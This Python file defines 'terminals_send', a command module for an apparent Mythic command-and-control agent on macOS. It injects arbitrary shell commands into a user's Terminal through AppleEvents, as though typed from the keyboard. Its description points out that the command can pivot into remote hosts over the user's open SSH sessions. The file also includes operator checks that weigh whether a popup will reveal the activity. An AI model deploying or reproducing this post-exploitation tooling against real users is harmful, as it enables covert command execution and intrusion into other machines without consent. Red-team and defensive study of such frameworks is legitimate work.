from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class TerminalsSendArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="window",
                type=ParameterType.Number,
                default_value=0,
                description="window # to send command to",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="tab",
                type=ParameterType.Number,
                default_value=0,
                description="tab # to send command to",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="command",
                type=ParameterType.String,
                description="command to execute",
                parameter_group_info=[ParameterGroupInfo()]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        raise ValueError("Must supply named arguments or use the modal")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class TerminalsSendCommand(CommandBase):
    cmd = "terminals_send"
    needs_admin = False
    help_cmd = "terminals_send"
    description = """
    This uses AppleEvents to inject the shell command, {command}, into the specified terminal shell as if the user typed it from the keyboard. This is pretty powerful. Consider the instance where the user is SSH-ed into another machine via terminal - with this you can inject commands to run on the remote host. Just remember, the user will be able to see the command, but you can always see what they see as well with the "terminals_read contents" command.
    """
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1552", "T1559", "T1548.003", "T1059.004"]
    argument_class = TerminalsSendArguments

    async def opsec_pre(self, taskData: PTTaskMessageAllData) -> PTTTaskOPSECPreTaskMessageResponse:
        tasks = await SendMythicRPCTaskSearch(MythicRPCTaskSearchMessage(
            TaskID=taskData.Task.ID,
            SearchHost=taskData.Callback.Host,
            SearchCommandNames=[self.cmd]
        ))
        response = PTTTaskOPSECPreTaskMessageResponse(
            TaskID=taskData.Task.ID, Success=True, OpsecPreBlocked=False,
            OpsecPreBypassRole="operator",
            OpsecPreMessage="This could cause a popup between your current context and Google Chrome!",
        )
        found = False
        if tasks.Success:
            logger.info(tasks.Tasks)
            for t in tasks.Tasks:
                logger.info(t.to_json())
                if t.Completed:
                    found = True
                    response = PTTTaskOPSECPreTaskMessageResponse(
                        TaskID=taskData.Task.ID, Success=True, OpsecPreBlocked=False,
                        OpsecPreBypassRole="operator",
                        Error="Another instance already caused a popup, letting this one go",
                        OpsecPreMessage="This will cause a popup between your current context and Terminal.app!",
                    )
                    break
        else:
            found = True
            response = PTTTaskOPSECPreTaskMessageResponse(
                TaskID=taskData.Task.ID, Success=False, OpsecPreBlocked=True,
                OpsecPreBypassRole="operator",
                Error="Failed to search for tasks on this host",
                OpsecPreMessage="This will cause a popup between your current context and Terminal.app!",
            )
        if not found:
            response = PTTTaskOPSECPreTaskMessageResponse(
                TaskID=taskData.Task.ID, Success=True, OpsecPreBlocked=True,
                OpsecPreBypassRole="operator",
                OpsecPreMessage="This will cause a popup between your current context and Terminal.app!",
            )
        return response

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"{taskData.args.get_arg('command')}",
            BaseArtifactType="Process Create"
        ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"Target Application of Terminal",
            BaseArtifactType="AppleEvent"
        ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
